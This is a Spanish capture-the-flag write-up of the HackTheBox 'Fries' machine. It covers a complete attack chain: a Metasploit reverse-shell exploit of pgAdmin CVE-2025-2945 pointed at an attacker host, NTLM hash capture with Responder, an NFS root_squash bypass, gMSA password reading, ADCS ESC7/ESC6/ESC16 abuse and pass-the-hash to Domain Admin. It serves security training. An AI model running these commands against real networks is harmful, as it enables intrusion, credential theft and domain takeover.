# HackTheBox - Fries (Hard) - Writeup Completo

**SO:** Windows Server 2019 (Active Directory) + Linux Docker Host  
**Dificultad:** Hard  
**Autor:** HTB  
**Fecha:** 5 de marzo de 2026  

## Resumen de la Cadena de Ataque

```
Subdomain Enum → Gitea (creds en historial de commits) → pgAdmin CVE-2025-2945 RCE
→ Container env vars → SSH como svc → NFS + Docker TLS certs
→ PWM + Responder (creds svc_infra) → WinRM svc_infra → ReadGMSAPassword (gMSA_CA_prod$)
→ ADCS ESC7 → ESC6 + ESC16 → Certificado de Administrator → Pass-the-Hash → Domain Admin
```

## Topología de Red

```
┌─────────────┐         ┌──────────────────────┐         ┌─────────────────────┐
│   KALI      │         │       DC01           │         │    web (Linux)      │
│ 10.10.xx.xx │────────▶│ 10.129.x.x          │         │ 192.168.100.2       │
│             │  VPN    │ fries.htb             │◀───────▶│ Docker Host         │
│             │         │ AD CS: fries-DC01-CA  │ Interna │ NFS, SSH, Docker    │
│             │         │                      │         │ Containers:         │
│             │         │                      │         │  - Gitea            │
│             │         │                      │         │  - pgAdmin          │
│             │         │                      │         │  - PostgreSQL       │
│             │         │                      │         │  - PWM              │
└─────────────┘         └──────────────────────┘         └─────────────────────┘
```

---

## 1. Enumeración

### Escaneo de Puertos

```bash
nmap -sC -sV -p- <TARGET_IP>
```

Servicios clave en DC01:
- 53 (DNS), 88 (Kerberos), 135 (RPC), 389/636 (LDAP/S)
- 445 (SMB), 5985 (WinRM), 80/443 (HTTP/S)
- 2049 (NFS - filtrado externamente)

### Sincronización de Reloj

```bash
sudo ntpdate -u <TARGET_IP>
```

Importante para Kerberos — el clock skew debe ser < 5 minutos.

### Enumeración de Subdominios

```bash
ffuf -u http://<TARGET_IP> -H "Host: FUZZ.fries.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
```

Subdominios descubiertos:
| Subdominio | Servicio |
|------------|----------|
| `code.fries.htb` | Gitea (repositorios Git) |
| `db-mgmt05.fries.htb` | pgAdmin 4 v9.1 |

---

## 2. Gitea - Credenciales en Historial de Commits

Se accede a `code.fries.htb` con las credenciales proporcionadas (usuario `dale`).

Se descubre un repositorio privado `dale/fries.htb`. En el historial de commits, se encuentra un commit de "gitignore update" que eliminó un archivo `.env` con credenciales:

```bash
# Usando la API de Gitea para explorar commits
curl -s "http://code.fries.htb/api/v1/repos/dale/fries.htb/git/commits/<COMMIT_HASH>" \
  -H "Authorization: token <TOKEN>"
```

Contenido del `.env` eliminado:
```
DATABASE_URL=postgresql://root:<DB_PASSWORD>@172.18.0.3:5432/ps_db
SECRET_KEY=<REDACTED>
```

También se extraen nombres del equipo de la página "About":
- Emma Thompson → `e.thompson`
- Daniel Rodriguez → `d.rodriguez`
- Sarah Chen → `s.chen`

---

## 3. pgAdmin - CVE-2025-2945 (RCE)

pgAdmin 4 v9.1 es vulnerable a **CVE-2025-2945** — ejecución remota de código a través del Query Tool autenticado.

### Explotación con Metasploit

```bash
msfconsole -q
use exploit/multi/http/pgadmin_query_tool_authenticated
set RHOSTS <TARGET_IP>
set VHOST db-mgmt05.fries.htb
set USERNAME <PGADMIN_USER>
set PASSWORD <PGADMIN_PASSWORD>
set DATABASE ps_db
set RDBMS_USERNAME root
set RDBMS_PASSWORD <DB_PASSWORD>
set LHOST <ATTACKER_IP>
set LPORT 4444
exploit
```

Se obtiene una shell de Meterpreter dentro del **contenedor de pgAdmin** (hostname `cb46692a4590`, IP `172.18.0.4`).

---

## 4. Pivote - Variables de Entorno del Contenedor

Desde la shell del contenedor pgAdmin, se leen las variables de entorno:

```bash
env | grep -i pgadmin
```

Se obtiene `PGADMIN_DEFAULT_PASSWORD=<REDACTED>` — esta contraseña se reutiliza para el usuario `svc` del host Linux.

---

## 5. SSH como svc

```bash
ssh svc@fries.htb  # Password: <PGADMIN_DEFAULT_PASSWORD>
```

Se accede al host Linux (`web`, IP `192.168.100.2`), que es el Docker host que corre todos los contenedores.

### Enumeración del host

- **NFS export:** `/srv/web.fries.htb *` (rw, no_subtree_check, insecure, **root_squash** habilitado)
- **Docker API:** `127.0.0.1:2376` con TLS + authz-broker plugin
- **Certificados Docker:** en `/etc/docker/certs/` (ca-key.pem y server-key.pem son root-only)
- **Directorio de certs:** `/srv/web.fries.htb/certs` (propiedad de `root:infra_managers`, GID de grupo AD)

---

## 6. NFS + Docker TLS Certs

### Montaje NFS con fake UID

Desde Kali, se usa `sshuttle` para crear un túnel y acceder al NFS del host Linux:

```bash
sshuttle -r svc@fries.htb -N
```

Se usa `fuse_nfs` con `--fake-uid` para montar el NFS y leer los certificados Docker protegidos:

```bash
fuse_nfs -n nfs://192.168.100.2/srv/web.fries.htb --fake-uid=0 /mnt/nfs
```

Con los certificados Docker TLS, se controla el Docker daemon y se accede a los contenedores.

---

## 7. PWM + Responder (Credenciales svc_infra)

Se configura PWM (Password Manager) para apuntar a la IP del atacante como servidor LDAP:

```bash
# Desde un contenedor Docker con los certs TLS
# Se modifica la configuración de PWM para LDAP server = <ATTACKER_IP>
```

Se levanta Responder para capturar el hash NTLM cuando PWM intenta autenticarse:

```bash
sudo responder -I tun0
```

Se captura el hash de `svc_infra` y se crackea:

```
svc_infra:<REDACTED>
```

---

## 8. WinRM como svc_infra

```bash
evil-winrm -i <TARGET_IP> -u svc_infra -p '<PASSWORD>'
```

Se accede al DC como `svc_infra`. Esta cuenta tiene el permiso **ReadGMSAPassword** sobre `gMSA_CA_prod$`.

### User Flag

```
user.txt: <REDACTED>
```

---

## 9. ReadGMSAPassword

Se lee el hash NTLM de la cuenta gMSA:

```bash
bloodyAD --host <TARGET_IP> -d fries.htb -u svc_infra -p '<PASSWORD>' \
  get object 'GMSA_CA_PROD$' --attr msDS-ManagedPassword
```

Se obtiene el hash NTLM de `gMSA_CA_prod$`: `<REDACTED>`

---

## 10. ADCS - ESC7 → ESC6 + ESC16

### Enumeración de ADCS

```bash
certipy-ad find -u svc_infra -p '<PASSWORD>' -dc-ip <TARGET_IP> -vulnerable
```

Se descubre que `gMSA_CA_prod$` tiene **ManageCA** sobre `fries-DC01-CA` → **ESC7**.

### Configuración de ESC6 + ESC16

Desde evil-winrm como `gMSA_CA_prod$`, se usa PSPKI para configurar la CA:

```powershell
# Conectar como gMSA
evil-winrm -i <TARGET_IP> -u 'gMSA_CA_prod$' -H <NTLM_HASH>

# Importar PSPKI y configurar
Import-Module PSPKI
$cr = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "DC01.fries.htb"
$cr.SetRootNode($true)

# ESC6: Habilitar EDITF_ATTRIBUTESUBJECTALTNAME2 en EditFlags
$cr.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")

# ESC16: Deshabilitar la extensión SID para que no sobreescriba el SID solicitado
$cr.SetConfigEntry("1.3.6.1.4.1.311.25.2", "DisableExtensionList", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
```

### Reinicio de la CA

```powershell
certutil -shutdown
# Esperar unos segundos
sc.exe start certsvc
```

### Solicitud de Certificado como Administrator

```bash
certipy-ad req -u "svc_infra" -p "<PASSWORD>" -dc-ip <TARGET_IP> \
  -ca 'fries-DC01-CA' -template 'User' \
  -upn 'administrator@fries.htb' \
  -sid 'S-1-5-21-<DOMAIN_SID>-500'
```

Se obtiene un certificado con UPN `administrator@fries.htb` y SID del Administrator.

---

## 11. Autenticación con Certificado → NT Hash

```bash
# Sincronizar reloj primero
sudo ntpdate -u <TARGET_IP>

# Autenticar con el certificado
certipy-ad auth -pfx administrator.pfx -dc-ip <TARGET_IP> \
  -username 'Administrator' -domain 'fries.htb'
```

Se obtiene el hash NT del Administrator: `<REDACTED>`

---

## 12. Pass-the-Hash → Domain Admin

```bash
evil-winrm -i <TARGET_IP> -u 'Administrator' -H <NT_HASH>
```

### Root Flag

```
root.txt: <REDACTED>
```

---

## Lecciones Aprendidas

1. **Nunca commitear secretos** — incluso si se eliminan después, permanecen en el historial de Git
2. **Reutilización de contraseñas** — la contraseña de pgAdmin se reutilizaba para SSH
3. **CVE-2025-2945** — pgAdmin 4 < v9.2 es vulnerable a RCE autenticado
4. **NFS con root_squash** — se puede evadir con `fuse_nfs --fake-uid`
5. **ADCS ESC7** — ManageCA permite modificar la configuración de la CA para habilitar ESC6+ESC16
6. **gMSA** — cuentas de servicio gestionadas pueden tener permisos excesivos sobre la PKI
7. **Docker TLS** — el acceso a los certificados Docker permite controlar el daemon completo

## Herramientas Utilizadas

- nmap, ffuf
- Gitea API
- Metasploit (CVE-2025-2945)
- sshpass, SSH
- sshuttle, fuse_nfs
- Responder
- evil-winrm
- bloodyAD
- certipy-ad
- PSPKI (PowerShell)

## Referencias

- [CVE-2025-2945 - pgAdmin RCE](https://nvd.nist.gov/vuln/detail/CVE-2025-2945)
- [Certipy - ADCS Abuse](https://github.com/ly4k/Certipy)
- [ESC7 - ManageCA Abuse](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [ESC16 - SID Extension Bypass](https://posts.specterops.io/adcs-esc16-esc17-a-new-era-of-adcs-attacks-f3e15e8d2f29)
- [PSPKI Module](https://www.pkisolutions.com/tools/pspki/)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [fuse_nfs](https://github.com/sahlberg/fuse-nfs)
